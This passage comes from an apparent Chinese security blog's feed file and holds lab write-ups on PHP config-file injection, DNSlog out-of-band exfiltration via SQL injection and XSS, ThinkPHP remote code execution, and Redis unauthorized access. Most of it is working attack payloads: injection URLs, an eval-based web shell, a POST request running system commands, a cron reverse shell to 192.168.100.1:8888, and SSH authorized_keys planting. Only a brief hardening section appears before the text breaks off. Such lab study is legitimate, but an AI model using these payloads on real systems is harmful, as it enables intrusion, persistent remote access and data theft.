+<li><a href="http://127.0.0.1/test.php?api=1%27;phpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;phpinfo();//</a>  #执行两次</li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/16.png" alt></li>
+</ol>
+<h2 id="0x05-define基础版"><a href="#0x05-define基础版" class="headerlink" title="0x05 define基础版"></a>0x05 define基础版</h2><pre><code>&lt;?php 
+$api=addslashes($_GET[&#39;api&#39;]);
+print_r($api);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=file_get_contents(&#39;./test1.php&#39;);
+print_r($file);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=preg_replace(&quot;/define\(&#39;API&#39;,&#39;.*&#39;\);/&quot;,&quot;define(&#39;API&#39;,&#39;{$api}&#39;);&quot;,$file);
+var_dump($file);
+
+file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php 
+define(&#39;API&#39;,&#39;&#39;);</code></pre><ol>
+<li>测试：<a href="http://127.0.0.1/test.php?api=\%27);%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=\%27);%0aphpinfo();//</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/17.png" alt></li>
+</ol>
+<h2 id="0x06-define单行版"><a href="#0x06-define单行版" class="headerlink" title="0x06 define单行版"></a>0x06 define单行版</h2><ol>
+<li>特点：define基础版加s修饰符</li>
+</ol>
+<pre><code>&lt;?php 
+$api=addslashes($_GET[&#39;api&#39;]);
+print_r($api);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=file_get_contents(&#39;./test1.php&#39;);
+print_r($file);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=preg_replace(&quot;/define\(&#39;API&#39;,&#39;.*&#39;\);/s&quot;,&quot;define(&#39;API&#39;,&#39;{$api}&#39;);&quot;,$file);
+var_dump($file);
+
+file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php 
+define(&#39;API&#39;,&#39;&#39;);</code></pre><ol>
+<li>与define基础版一样，测试：<a href="http://127.0.0.1/test.php?api=\%27);%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=\%27);%0aphpinfo();//</a></li>
+</ol>
+<h2 id="0x07-define基础版非贪婪版"><a href="#0x07-define基础版非贪婪版" class="headerlink" title="0x07 define基础版非贪婪版"></a>0x07 define基础版非贪婪版</h2><ol>
+<li>特点：define基础版非贪婪模式</li>
+</ol>
+<pre><code>&lt;?php 
+$api=addslashes($_GET[&#39;api&#39;]);
+print_r($api);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=file_get_contents(&#39;./test1.php&#39;);
+print_r($file);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=preg_replace(&quot;/define\(&#39;API&#39;,&#39;.*?&#39;\);/&quot;,&quot;define(&#39;API&#39;,&#39;{$api}&#39;);&quot;,$file);
+var_dump($file);
+
+file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php 
+define(&#39;API&#39;,&#39;&#39;);</code></pre><ol>
+<li>测试：<a href="http://127.0.0.1/test.php?api=%27);%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=%27);%0aphpinfo();//</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/18.png" alt></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/19.png" alt></li>
+<li>闭合单引号测试：<a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/20.png" alt></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/21.png" alt></li>
+</ol>
+<h2 id="0x08-define单行非贪婪版"><a href="#0x08-define单行非贪婪版" class="headerlink" title="0x08 define单行非贪婪版"></a>0x08 define单行非贪婪版</h2><pre><code>&lt;?php 
+$api=addslashes($_GET[&#39;api&#39;]);
+print_r($api);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=file_get_contents(&#39;./test1.php&#39;);
+print_r($file);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=preg_replace(&quot;/define\(&#39;API&#39;,&#39;.*?&#39;\);/s&quot;,&quot;define(&#39;API&#39;,&#39;{$api}&#39;);&quot;,$file);
+var_dump($file);
+
+file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><ol>
+<li>测试：<a href="http://127.0.0.1/test.php?api=%27);phpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=%27);phpinfo();//</a></li>
+<li><a href="http://127.0.0.1/test.php?api=" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/22.png" alt></li>
+</ol>
+<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
+<li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DNSlog</title>
+    <url>/DNSlog/</url>
+    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><ol>
+<li>安全测试时，有些操作很难明显验证或利用，DNSlog可以当作回显证明。</li>
+<li>具体原理：</li>
+<li><img src="/DNSlog/6.png" alt></li>
+<li>红色部分可控，可自主搭建DNS服务器（这里使用在线的DNSlog平台），来获取DNS解析日志来验证测试结果。</li>
+</ol>
+<h2 id="0x01-DNSlog平台"><a href="#0x01-DNSlog平台" class="headerlink" title="0x01 DNSlog平台"></a>0x01 DNSlog平台</h2><ol>
+<li>在线DNSlog平台：</li>
+<li><ul>
+<li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a></li>
+</ul>
+</li>
+</ol>
+<h2 id="0x02-子域"><a href="#0x02-子域" class="headerlink" title="0x02 子域"></a>0x02 子域</h2><ol>
+<li>每个用户都有唯一的子域值：<strong>[用户唯一标识字符串].ceye.io</strong> #其他网站有其他的域名。</li>
+</ol>
+<h2 id="0x03-简单测试"><a href="#0x03-简单测试" class="headerlink" title="0x03 简单测试"></a>0x03 简单测试</h2><ol>
+<li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li>
+<li>获取子域值（识别码）</li>
+<li><img src="/DNSlog/1.png" alt></li>
+<li><strong>curl [任意字符].[用户唯一标识字符串].ceye.io</strong></li>
+<li><img src="/DNSlog/2.png" alt></li>
+<li>查看ceye.io的http请求记录</li>
+<li><img src="/DNSlog/3.png" alt></li>
+<li><strong>ping [任意字符].[用户唯一标识字符串].ceye.io</strong></li>
+<li><img src="/DNSlog/4.png" alt></li>
+<li>查看ceye.io的DNS查询记录</li>
+<li><img src="/DNSlog/5.png" alt></li>
+</ol>
+<h2 id="0x04-环境测试"><a href="#0x04-环境测试" class="headerlink" title="0x04 环境测试"></a>0x04 环境测试</h2><p><strong>sql盲注</strong></p>
+<ol>
+<li>使用load_file()函数来加载，前提：secure_file_priv的值为空</li>
+<li>mysql命令查询：</li>
+<li><strong>select variables like ‘%secure%’;</strong></li>
+<li><img src="/DNSlog/7.png" alt></li>
+<li>空，即可读取磁盘的目录</li>
+<li>如果是C:\，/root等等指定的盘符目录，即可读取指定盘符目录下的文件</li>
+<li>null，则不能加载文件。</li>
+<li>可修改配置文件mysql.ini来设置secure_file_priv的值</li>
+<li>修改[mysqld]下：secure_file_priv=””，没有就在末尾添加secure_file_priv=””</li>
+<li>修改后，重启mysql，测试加载本地文件：</li>
+<li><img src="/DNSlog/8.png" alt></li>
+<li><img src="/DNSlog/9.png" alt></li>
+<li>通过load_file()来发起URL连接，格式：\URL</li>
+<li><strong>select load_file(‘\\mysql.[用户唯一标识字符串].ceye.io\test’);</strong></li>
+<li><img src="/DNSlog/10.png" alt></li>
+<li>使用sqli-labs靶场的盲注测试</li>
+<li><a href="http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;</a> and if((select load_file(‘\\sqli.[用户唯一标识字符串].ceye.io\test’)),1,0)%23</li>
+<li><img src="/DNSlog/11.png" alt></li>
+</ol>
+<p><strong>XSS</strong></p>
+<ol>
+<li>dvwa的xss例子</li>
+<li><img src="/DNSlog/12.png" alt></li>
+<li><img src="/DNSlog/13.png" alt></li>
+<li>&lt;img src=<a href="http://xss.[用户唯一标识字符串].ceye.io&gt;" target="_blank" rel="noopener">http://xss.[用户唯一标识字符串].ceye.io&gt;</a></li>
+<li><img src="/DNSlog/14.png" alt></li>
+<li><img src="/DNSlog/15.png" alt></li>
+</ol>
+<p>还有SSRF（无回显），命令执行（无回显）等等</p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ol>
+<li>任何可以访问或请求URL的地方，即可利用DNSlog验证。</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Thinkphp</title>
+    <url>/Thinkphp/</url>
+    <content><![CDATA[<h2 id="0x00-Thinkphp"><a href="#0x00-Thinkphp" class="headerlink" title="0x00 Thinkphp"></a>0x00 Thinkphp</h2><ol>
+<li>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架。</li>
+<li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub的github资源</a></li>
+</ol>
+<h2 id="0x10-Thinkphp-2-x-任意代码执行漏洞"><a href="#0x10-Thinkphp-2-x-任意代码执行漏洞" class="headerlink" title="0x10 Thinkphp 2.x 任意代码执行漏洞"></a>0x10 Thinkphp 2.x 任意代码执行漏洞</h2><h3 id="0x11-简介"><a href="#0x11-简介" class="headerlink" title="0x11 简介"></a>0x11 简介</h3><ol>
+<li>ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：</li>
+</ol>
+<pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></pre><ol>
+<li>用户输入的参数被插入双引号中执行，造成任意代码执行漏洞，thinkphp3.0版本因为lite模式下没有修复该漏洞而同样存在此漏洞。</li>
+</ol>
+<h3 id="0x12-环境"><a href="#0x12-环境" class="headerlink" title="0x12 环境"></a>0x12 环境</h3><ol>
+<li>docker搭建</li>
+<li>docker-compose up -d</li>
+<li><img src="/Thinkphp/1.png" alt></li>
+<li>环境搭建成功</li>
+<li><img src="/Thinkphp/2.png" alt></li>
+<li>漏洞复现：<a href="http://127.0.0.1:8080/index.php?s=/index/index/name/${phpinfo()}" target="_blank" rel="noopener">http://127.0.0.1:8080/index.php?s=/index/index/name/${phpinfo()}</a></li>
+<li><img src="/Thinkphp/3.png" alt></li>
+<li><strong>其他</strong></li>
+<li><a href="http://192.168.100.4:8080/index.php?s=/index/index/name/${@print(THINK_VERSION)}" target="_blank" rel="noopener">http://192.168.100.4:8080/index.php?s=/index/index/name/${@print(THINK_VERSION)}</a></li>
+<li><a href="http://192.168.100.4:8080/index.php?s=/index/index/name/${@print(eval($_POST[c]))}" target="_blank" rel="noopener">http://192.168.100.4:8080/index.php?s=/index/index/name/${@print(eval($_POST[c]))}</a> #菜刀连接，密码c</li>
+</ol>
+<h2 id="0x20-Thinkphp5-5-0-22-5-1-29-远程代码执行漏洞"><a href="#0x20-Thinkphp5-5-0-22-5-1-29-远程代码执行漏洞" class="headerlink" title="0x20 Thinkphp5 5.0.22/5.1.29 远程代码执行漏洞"></a>0x20 Thinkphp5 5.0.22/5.1.29 远程代码执行漏洞</h2><h3 id="0x21-简介"><a href="#0x21-简介" class="headerlink" title="0x21 简介"></a>0x21 简介</h3><ol>
+<li>ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</li>
+</ol>
+<h3 id="0x22-环境"><a href="#0x22-环境" class="headerlink" title="0x22 环境"></a>0x22 环境</h3><ol>
+<li>进入环境目录，拉取环境：</li>
+<li>docker-compose up -d </li>
+<li><img src="/Thinkphp/7.png" alt></li>
+<li>访问默认启动页面：<a href="http://192.168.100.4:8080/" target="_blank" rel="noopener">http://192.168.100.4:8080/</a></li>
+<li><img src="/Thinkphp/5.png" alt></li>
+<li>访问phpinfo，执行phpinfo()代码：<a href="http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1" target="_blank" rel="noopener">http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a></li>
+<li><img src="/Thinkphp/6.png" alt></li>
+<li>执行代码：<a href="http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id" target="_blank" rel="noopener">http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id</a></li>
+<li><img src="/Thinkphp/8.png" alt></li>
+<li>命令执行：<a href="http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami" target="_blank" rel="noopener">http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</a> #www-data www-data</li>
+<li>写入文件：<a href="http://192.168.100.4:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=加你要写入的文件内容url编码" target="_blank" rel="noopener">http://192.168.100.4:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=加你要写入的文件内容url编码</a></li>
+</ol>
+<h2 id="0x30-ThinkPHP5-5-0-23-远程代码执行漏洞"><a href="#0x30-ThinkPHP5-5-0-23-远程代码执行漏洞" class="headerlink" title="0x30 ThinkPHP5 5.0.23 远程代码执行漏洞"></a>0x30 ThinkPHP5 5.0.23 远程代码执行漏洞</h2><h3 id="0x31-简介"><a href="#0x31-简介" class="headerlink" title="0x31 简介"></a>0x31 简介</h3><ol>
+<li>ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</li>
+</ol>
+<h3 id="0x32-环境"><a href="#0x32-环境" class="headerlink" title="0x32 环境"></a>0x32 环境</h3><ol>
+<li>进入环境目录，拉取环境：</li>
+<li>docker-compose up -d</li>
+<li><img src="/Thinkphp/9.png" alt></li>
+<li>访问默认启动页面：<a href="http://192.168.100.4:8080/" target="_blank" rel="noopener">http://192.168.100.4:8080/</a></li>
+<li><img src="/Thinkphp/10.png" alt></li>
+</ol>
+<pre><code>POST /index.php?s=captcha HTTP/1.1
+Host: 192.168.100.4:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></pre><ol>
+<li><img src="/Thinkphp/11.png" alt></li>
+</ol>
+<h2 id="0x40-ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露"><a href="#0x40-ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露" class="headerlink" title="0x40 ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露"></a>0x40 ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</h2><h3 id="0x41-环境"><a href="#0x41-环境" class="headerlink" title="0x41 环境"></a>0x41 环境</h3><ol>
+<li>进入环境目录，拉取环境：</li>
+<li>docker-compose up -d</li>
+<li><img src="/Thinkphp/12.png" alt></li>
+<li>漏洞测试：<a href="http://192.168.100.4/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1" target="_blank" rel="noopener">http://192.168.100.4/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</a></li>
+<li><img src="/Thinkphp/13.png" alt></li>
+</ol>
+<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
+<li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub的github资源</a></li>
+<li><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">https://xz.aliyun.com/</a></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>未授权访问漏洞</title>
+    <url>/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="0x00-未授权漏洞"><a href="#0x00-未授权漏洞" class="headerlink" title="0x00 未授权漏洞"></a>0x00 未授权漏洞</h2><ol>
+<li>未授权漏洞，指网页、主机或服务等等因缺少安全配置或权限设置存在缺陷导致无访问权限的其他用户可以直接访问，容易造成用户信息或目录被泄露，数据或数据库被增删改查等等危害。</li>
+</ol>
+<h2 id="0x10-Redis"><a href="#0x10-Redis" class="headerlink" title="0x10 Redis"></a>0x10 Redis</h2><h3 id="0x11-简介"><a href="#0x11-简介" class="headerlink" title="0x11 简介"></a>0x11 简介</h3><ol>
+<li>默认情况下，会绑定0.0.0.0:6379。</li>
+<li>如果没有安全设置相关权限，如无密码可登录，访问ip无限制，用户弱密码等等，redis就有易被入侵的隐患。</li>
+<li>攻击者可利用未授权漏洞访问redis，读取数据，利用config命令进行写操作，写入可利用文件，导致被完全控制等等。</li>
+</ol>
+<h3 id="0x12-环境"><a href="#0x12-环境" class="headerlink" title="0x12 环境"></a>0x12 环境</h3><ol>
+<li>Centos 7</li>
+<li><a href="https://redis.io/download" target="_blank" rel="noopener">redis官网下载</a></li>
+<li><a href="https://code.google.com/archive/p/redis/downloads" target="_blank" rel="noopener">redis历史版本下载</a></li>
+<li>安装：wget <a href="http://download.redis.io/releases/redis-5.0.8.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-5.0.8.tar.gz</a></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1.png" alt></li>
+<li>解压压缩包：tar zxvf redis-5.0.8.tar.gz </li>
+<li>进入目录：cd redis-5.0.8</li>
+<li>编译：make</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/2.png" alt></li>
+<li>cd src/</li>
+<li>启动redis server：./redis-server</li>
+<li>使用redis.conf文件中的配置启动redis server：./redis-server ../redis.conf</li>
+</ol>
+<h3 id="0x13-终端运行客户端"><a href="#0x13-终端运行客户端" class="headerlink" title="0x13 终端运行客户端"></a>0x13 终端运行客户端</h3><ol>
+<li>启动redis cli：./redis-cli</li>
+<li>获取所有配置项</li>
+<li>127.0.0.1:6379&gt; config get *</li>
+<li>编辑配置</li>
+<li>127.0.0.1:6379&gt; config set [key] [value]</li>
+<li>查看是否设置密码</li>
+<li>127.0.0.1:6379&gt; config get requirepass</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/6.png" alt></li>
+<li>设置密码</li>
+<li>127.0.0.1:6379&gt; config set requirepass [password]</li>
+<li>还可以修改redis.conf文件</li>
+<li>修改# requirepass foobared 为 requirepass [password]</li>
+</ol>
+<h3 id="0x14-图形化windows-redis客户端"><a href="#0x14-图形化windows-redis客户端" class="headerlink" title="0x14 图形化windows redis客户端"></a>0x14 图形化windows redis客户端</h3><ol>
+<li><a href="https://github.com/caoxinyu/RedisClient/releases" target="_blank" rel="noopener">图形化redis客户端</a></li>
+<li>下载jar版：<a href="https://github.com/caoxinyu/RedisClient/blob/windows/release/redisclient-win32.x86_64.2.0.jar?raw=true" target="_blank" rel="noopener">redisclient-win32.x86_64.2.0.jar</a></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3.png" alt></li>
+<li>登录</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/4.png" alt></li>
+<li>登录不了</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5.png" alt></li>
+<li>修改redis.conf</li>
+<li>bind 127.0.0.1前加上#</li>
+<li>重启redis</li>
+<li>./redis-cli -h 127.0.0.1 -p 6379 shutdown #（源码安装的重启方式）</li>
+<li>再启动登录</li>
+<li>./redis-server ../redis.conf</li>
+<li>继续报错</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/7.png" alt></li>
+<li>原因是保护模式禁止无密码登录，修改配置或修改配置文件</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8.png" alt></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/9.png" alt></li>
+<li>版本太低。。。</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/10.png" alt></li>
+<li>下载exe版：<a href="https://raw.githubusercontent.com/caoxinyu/RedisClient/windows/release/redisclient-win32.x86.2.0.exe" target="_blank" rel="noopener">redisclient-win32.x86.2.0.exe</a></li>
+<li>无密码登录成功</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/11.png" alt></li>
+</ol>
+<h3 id="0x15-redis服务器部署网站"><a href="#0x15-redis服务器部署网站" class="headerlink" title="0x15 redis服务器部署网站"></a>0x15 redis服务器部署网站</h3><ol>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/13.png" alt></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/14.png" alt></li>
+</ol>
+<h3 id="0x16-未授权测试——写入shell"><a href="#0x16-未授权测试——写入shell" class="headerlink" title="0x16 未授权测试——写入shell"></a>0x16 未授权测试——写入shell</h3><ol>
+<li>前面是前提，登录后，写入shell</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/12.png" alt></li>
+<li>config set dir /var/www/html</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/15.png" alt></li>
+<li>config set dbfilename shell.php</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/16.png" alt></li>
+<li>set webshell “&lt;?php phpinfo()?&gt;” </li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/17.png" alt></li>
+<li>save</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/18.png" alt></li>
+<li>成功写入，访问验证</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/19.png" alt></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/20.png" alt></li>
+</ol>
+<h3 id="0x17-未授权测试——反弹shell"><a href="#0x17-未授权测试——反弹shell" class="headerlink" title="0x17 未授权测试——反弹shell"></a>0x17 未授权测试——反弹shell</h3><ol>
+<li>启动端口监听</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/22.png" alt></li>
+<li>config set dir /var/spool/cron</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/21.png" alt></li>
+<li>set test “\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.1/8888 0&gt;&amp;1\n”</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/23.png" alt></li>
+<li>config set dbfilename root</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/24.png" alt></li>
+<li>save</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/25.png" alt></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/26.png" alt></li>
+<li>成功反弹shell</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/27.png" alt></li>
+</ol>
+<h3 id="0x18-nmap扫描redis"><a href="#0x18-nmap扫描redis" class="headerlink" title="0x18 nmap扫描redis"></a>0x18 nmap扫描redis</h3><ol>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/28.png" alt></li>
+</ol>
+<h3 id="0x19-redis写入公钥免密登录"><a href="#0x19-redis写入公钥免密登录" class="headerlink" title="0x19 redis写入公钥免密登录"></a>0x19 redis写入公钥免密登录</h3><ol>
+<li>cd ~/.ssh/</li>
+<li>ssh-keygen -t rsa</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/29.png" alt></li>
+<li>set test “\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDct/BllGmDdk/zqRJV5/ES5MgfhtmoMoZP/1Y7WgETGxMWRGxnTll8VQeOhFNbfwTPof98jxKUUc8rBU5+zgZl517LNlyGK14ifwVIO3Q6tJTm+rrZHUqn/4b1JX/rzUcjq2kcWr4VyRttSeHibim2Tj0S/7Y3Jyn5tKi4F2J3X9WdVk0CwPV8fyLUAg/rSed0z/IdeDKMuzetjUWZBtgmBGbP2NW+P7nHS+g4cEEr5Hebf2rnUQtd/oBIfnfajsZKWpQOux7c1YF2L6uFd0J6ShXwHyznrOuz8bNsdyEZY/xPIpw84+E28VEJFttiPeuE+/uYakFUj0YejZNxb3kB+FaItJ09Fx8JTfJOJroa4Dv44frXMzTR0coSnQS5lPfxmM3An8xGuFL4qtMtRqdVXbpNJ5RycAKLnoiObMi3TiuHwwdzpOSUiXFooES89v/29gHdC7T3X5aO88/lAUVtBy6drwtkXtJ3q3ECNjuvcwrmwSmHnRHlyTXV58rWps= root@kali\n\n\n”</li>
+<li>config set dir /root/.ssh/</li>
+<li>config set dbfilename authorized_keys</li>
+<li>save</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/30.png" alt></li>
+<li>利用公钥免密登录ssh</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/31.png" alt></li>
+</ol>
+<h3 id="0x1A-安全加固"><a href="#0x1A-安全加固" class="headerlink" title="0x1A 安全加固"></a>0x1A 安全加固</h3><ol>
+<li>redis默认监听127.0.0.1</li>
+<li>修改redis.conf，去掉#bind 127.0.0.1前的#，指定允许访问的IP</li>
+<li><ul>
+<li>bind 192.168.100.1 127.0.0.1 #保存，重启才能生效</li>
+</ul>
+</li>
+<li>设置防火墙策略，仅允许指定IP来访问redis服务</li>
+<li><ul>
